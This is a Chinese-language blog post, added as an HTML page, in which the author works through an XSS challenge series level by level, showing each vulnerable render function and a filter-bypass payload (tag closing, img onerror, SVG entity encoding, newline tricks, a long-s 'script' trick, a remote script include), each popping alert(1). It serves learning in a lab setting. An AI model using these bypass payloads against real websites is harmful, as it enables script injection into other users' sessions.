@@ -1,0 +1,787 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言最近因为工作嘛，学的都是web安全，做了一个关于这个xss的闯关练习，虽然比较简单，但是我还是不怎么会，所以说看了网上的答案后，自己琢磨了一下，写篇总结吧。 简述xss这个xss啊，就比较简单了，简单的说其实很多漏洞都是把数据当命令或者代码执行了，数据又是用户可控的，所以说产生了不少现在比较流行的出名的漏洞了对吧，你看，像什么xss啦，什么sql注入啦什么的都是这样的对吧。像xss，你看，本来">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss练习总结">
+<meta property="og:url" content="http://yoursite.com/2018/09/26/xss练习总结/index.html">
+<meta property="og:site_name" content="Binarever">
+<meta property="og:description" content="前言最近因为工作嘛，学的都是web安全，做了一个关于这个xss的闯关练习，虽然比较简单，但是我还是不怎么会，所以说看了网上的答案后，自己琢磨了一下，写篇总结吧。 简述xss这个xss啊，就比较简单了，简单的说其实很多漏洞都是把数据当命令或者代码执行了，数据又是用户可控的，所以说产生了不少现在比较流行的出名的漏洞了对吧，你看，像什么xss啦，什么sql注入啦什么的都是这样的对吧。像xss，你看，本来">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-09-26T10:25:11.522Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="xss练习总结">
+<meta name="twitter:description" content="前言最近因为工作嘛，学的都是web安全，做了一个关于这个xss的闯关练习，虽然比较简单，但是我还是不怎么会，所以说看了网上的答案后，自己琢磨了一下，写篇总结吧。 简述xss这个xss啊，就比较简单了，简单的说其实很多漏洞都是把数据当命令或者代码执行了，数据又是用户可控的，所以说产生了不少现在比较流行的出名的漏洞了对吧，你看，像什么xss啦，什么sql注入啦什么的都是这样的对吧。像xss，你看，本来">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/09/26/xss练习总结/"/>
+
+
+
+
+
+  <title>xss练习总结 | Binarever</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Binarever</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/26/xss练习总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Binarever">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Binarever">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">xss练习总结</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-26T17:02:34+08:00">
+                2018-09-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近因为工作嘛，学的都是web安全，做了一个关于这个xss的闯关练习，虽然比较简单，但是我还是不怎么会，所以说看了网上的答案后，自己琢磨了一下，写篇总结吧。</p>
+<h1 id="简述xss"><a href="#简述xss" class="headerlink" title="简述xss"></a>简述xss</h1><p>这个xss啊，就比较简单了，简单的说其实很多漏洞都是把数据当命令或者代码执行了，数据又是用户可控的，所以说产生了不少现在比较流行的出名的漏洞了对吧，你看，像什么xss啦，什么sql注入啦什么的都是这样的对吧。像xss，你看，本来是用户输入的数据，结果你把他输出到网页上，那数据肯定是以html标签包含的形式输入的嘛，那你把输入的数据写成<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1);&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>那你说会发生什么，自然会执行这个script脚本弹窗‘1’嘛对吧，所以就有了xss这个漏洞，而今天我要说的就是一个关于这个东西的闯关练习。</p>
+<h1 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> render (input) &#123;</span><br><span class="line">  <span class="built_in">return</span> <span class="string">'&lt;div&gt;'</span> + input + <span class="string">'&lt;/div&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>后台代码张这样，就很简单了是吧。</p>
+<p>简单粗暴的payload:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>输出的html就是这样</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
+<p>这就是标准的xss攻击手段。</p>
+<h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> render (input) &#123;</span><br><span class="line">  <span class="built_in">return</span> <span class="string">'&lt;textarea&gt;'</span> + input + <span class="string">'&lt;/textarea&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个textarea标签会无法执行xss</p>
+<p>所以我们需要直接把这个标签闭合才能执行xss，像这样：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>html张这样：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea&gt;&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/textarea&gt;</span><br></pre></td></tr></table></figure>
+<h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> render (input) &#123;</span><br><span class="line">  <span class="built_in">return</span> <span class="string">'&lt;input type="name" value="'</span> + input + <span class="string">'"&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个就是直接在input框中输出</p>
+<p>也很简单</p>
+<p>直接就用那个双引号和大于号闭合前面的双引号和标签</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p>html是这样</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input <span class="built_in">type</span>=<span class="string">"name"</span> value=<span class="string">""</span>&gt;&lt;script&gt;alert(1)&lt;/script&gt;<span class="string">"&gt;</span></span><br></pre></td></tr></table></figure>
+<h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> render (input) &#123;</span><br><span class="line">  const stripBracketsRe = /[()]/g</span><br><span class="line">  input = input.replace(stripBracketsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="built_in">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个就是标准的黑名单了</p>
+<p>把这个括号给过滤了，所以说用那个`来代替，为什么的话因为后面的题就是把这两个都过滤了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=alert`1`&gt;</span><br></pre></td></tr></table></figure>
+<p>这个是img标签的引发错误的xss也是很常用很好用的payload,几乎就几个很好用，一个是img，一个是script的标准payload，还有就是svg。</p>
+<p>html是这样</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=alert`1`&gt;</span><br></pre></td></tr></table></figure>
+<p>可以弹窗。</p>
+<h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> render (input) &#123;</span><br><span class="line">  const stripBracketsRe = /[()`]/g</span><br><span class="line">  input = input.replace(stripBracketsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="built_in">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>你看，这个就把这个括号和这个`全都过滤了，就只有用svg标签加unicode编码，因为这个unicode编码只有在svg标签里才能生效。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;alert&amp;<span class="comment">#40;1&amp;#41;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p>html是这样：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;alert&amp;<span class="comment">#40;1&amp;#41;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+<h1 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> render (input) &#123;</span><br><span class="line">  input = input.replace(/--&gt;/g, <span class="string">'😂'</span>)</span><br><span class="line">  <span class="built_in">return</span> <span class="string">'&lt;!-- '</span> + input + <span class="string">' --&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个把注释的后半段给过滤了</p>
+<p>不过可以通过加一个！给绕过，说实话这个是真的感觉没啥意义</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--!&gt;&lt;img src=x onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+<h1 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> render (input) &#123;</span><br><span class="line">  input = input.replace(/auto|on.*=|&gt;/ig, <span class="string">'_'</span>)</span><br><span class="line">  <span class="built_in">return</span> `&lt;input value=1 <span class="variable">$&#123;input&#125;</span> <span class="built_in">type</span>=<span class="string">"text"</span>&gt;`</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个过滤就有点麻烦了，直接把这个on事件加等号给过滤的</p>
+<p>我还真不知道怎么处理，不过查到是用换行处理</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">onmouseover</span><br><span class="line">=alert(1)</span><br></pre></td></tr></table></figure>
+<p>html：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input value=1 onmouseover</span><br><span class="line">=alert(1) <span class="built_in">type</span>=<span class="string">"text"</span>&gt;</span><br></pre></td></tr></table></figure>
+<h1 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> render (input) &#123;</span><br><span class="line">  const stripTagsRe = /&lt;\/?[^&gt;]+&gt;/gi</span><br><span class="line"></span><br><span class="line">  input = input.replace(stripTagsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="built_in">return</span> `&lt;article&gt;<span class="variable">$&#123;input&#125;</span>&lt;/article&gt;`</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个的话做出的过滤是不能让这个&lt;&gt;成对出现，所以只能用一半</p>
+<p>&lt;svg/onload=’alert(1)’</p>
+<p>所以说刚才说svg很好用是吧又可以编码又可以只用一半，吊吧</p>
+<p>html:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;article&gt;&lt;svg/onload=<span class="string">'alert(1)'</span>&lt;/article&gt;</span><br></pre></td></tr></table></figure>
+<h1 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> render (src) &#123;</span><br><span class="line">  src = src.replace(/&lt;\/style&gt;/ig, <span class="string">'/* \u574F\u4EBA */'</span>)</span><br><span class="line">  <span class="built_in">return</span> `</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">      <span class="variable">$&#123;src&#125;</span></span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">  `</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个过滤很明显就是把这个换成了另外的字符了</p>
+<p>所以直接回车绕过</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;/style</span><br><span class="line">&gt;&lt;img src=x onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+<p>说实话这个字符过滤回车绕过是神器啊</p>
+<p>html:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">      &lt;/style</span><br><span class="line">&gt;&lt;img src=x onerror=alert(1)&gt;</span><br><span class="line">    &lt;/style&gt;</span><br></pre></td></tr></table></figure>
+<h1 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> render (input) &#123;</span><br><span class="line">  <span class="built_in">let</span> domainRe = /^https?:\/\/www\.segmentfault\.com/</span><br><span class="line">  <span class="keyword">if</span> (domainRe.test(input)) &#123;</span><br><span class="line">    <span class="built_in">return</span> `&lt;script src=<span class="string">"<span class="variable">$&#123;input&#125;</span>"</span>&gt;&lt;/script&gt;`</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> <span class="string">'Invalid URL'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个东西看得我有点乱</p>
+<p>是个先要满足输入匹配上面那个网址，然后再输出，不然不让输出</p>
+<p>所以就直接绕过了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.segmentfault.com<span class="string">"&gt;&lt;/script&gt;&lt;script&gt;alert(1)//</span></span><br></pre></td></tr></table></figure>
+<p>html:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"https://www.segmentfault.com"</span>&gt;&lt;/script&gt;&lt;script&gt;alert(1)//<span class="string">"&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+<h1 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h1><p>没做出来，应该是答案没生效</p>
+<h1 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> render (input) &#123;</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="built_in">return</span> `&lt;h1&gt;<span class="variable">$&#123;input&#125;</span>&lt;/h1&gt;`</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>输入全部大写，试了一下，确实不行</p>
+<p>结果img标签加编码就行了，因为html标签大小写无影响；js严格区分大小写。</p>
+<p>所以说一种是script标签加src跨域引入，另一种是这样</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=&amp;<span class="comment">#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&gt;</span></span><br></pre></td></tr></table></figure>
+<p>html:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;&lt;IMG SRC=X ONERROR=&amp;<span class="comment">#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&gt;&lt;/h1&gt;</span></span><br></pre></td></tr></table></figure>
+<h1 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> render (input) &#123;</span><br><span class="line">  input = input.replace(/script/ig, <span class="string">''</span>)</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="built_in">return</span> <span class="string">'&lt;h1&gt;'</span> + input + <span class="string">'&lt;/h1&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个。。。就是为了防止上一个题的跨域，用html标签加html实体编码就行了。</p>
+<p>payload一样</p>
+<h1 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> render (input) &#123;</span><br><span class="line">  input = input.replace(/[&lt;/<span class="string">"']/g, '')</span></span><br><span class="line"><span class="string">  return `</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">          // alert('<span class="variable">$&#123;input&#125;</span>')</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>这个的话是需要绕过这个//注释符。</p>
+<p>所以我们又要用回车的这个神器了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">alert(1);//</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+<p>html:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">          // alert(<span class="string">'</span></span><br><span class="line"><span class="string">alert(1);</span></span><br><span class="line"><span class="string">--&gt;'</span>)</span><br><span class="line">    &lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h1 id="0x0E"><a href="#0x0E" class="headerlink" title="0x0E"></a>0x0E</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> render (input) &#123;</span><br><span class="line">  input = input.replace(/&lt;([a-zA-Z])/g, <span class="string">'&lt;_$1'</span>)</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="built_in">return</span> <span class="string">'&lt;h1&gt;'</span> + input + <span class="string">'&lt;/h1&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个就厉害了，不让&lt;后面加任何字符，加了都要用_隔开</p>
+<p>这个是真没招，嚯哟网上个个都是人才，你看这个payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ſcript src=<span class="string">"https://xss.haozi.me/j.js"</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>你敢信</p>
+<p>html:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;&lt;SCRIPT SRC=<span class="string">"HTTPS://XSS.HAOZI.ME/J.JS"</span>&gt;&lt;/SCRIPT&gt;&lt;/h1&gt;</span><br></pre></td></tr></table></figure>
+<p>有点迷</p>
+<h1 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> render (input) &#123;</span><br><span class="line">  <span class="keyword">function</span> escapeHtml(s) &#123;</span><br><span class="line">    <span class="built_in">return</span> s.replace(/&amp;/g, <span class="string">'&amp;amp;'</span>)</span><br><span class="line">            .replace(/<span class="string">'/g, '</span>&amp;<span class="comment">#39;')</span></span><br><span class="line">            .replace(/<span class="string">"/g, '&amp;quot;')</span></span><br><span class="line"><span class="string">            .replace(/&lt;/g, '&amp;lt;')</span></span><br><span class="line"><span class="string">            .replace(/&gt;/g, '&amp;gt;')</span></span><br><span class="line"><span class="string">            .replace(/\//g, '&amp;#x2f;')</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  return `&lt;img src onerror="</span>console.error(<span class="string">'$&#123;escapeHtml(input)&#125;'</span>)<span class="string">"&gt;`</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>这个的过滤就有点多了</p>
+<p>但是在img标签里，直接闭合前面的，在加个时间就行了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">');alert(1)//</span></span><br></pre></td></tr></table></figure>
+<p>html:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src onerror=<span class="string">"console.error('&amp;#39;);alert(1)&amp;#x2f;&amp;#x2f;')"</span>&gt;</span><br></pre></td></tr></table></figure></p>
+<h1 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> render (input) &#123;</span><br><span class="line">  <span class="built_in">return</span> `</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  window.data = <span class="variable">$&#123;input&#125;</span></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">  `</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个我是真的迷</p>
+<p>payload:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(1);</span><br></pre></td></tr></table></figure>
+<p>html:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  window.data = alert(1);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>然后就ok了，我也不知道为什么</p>
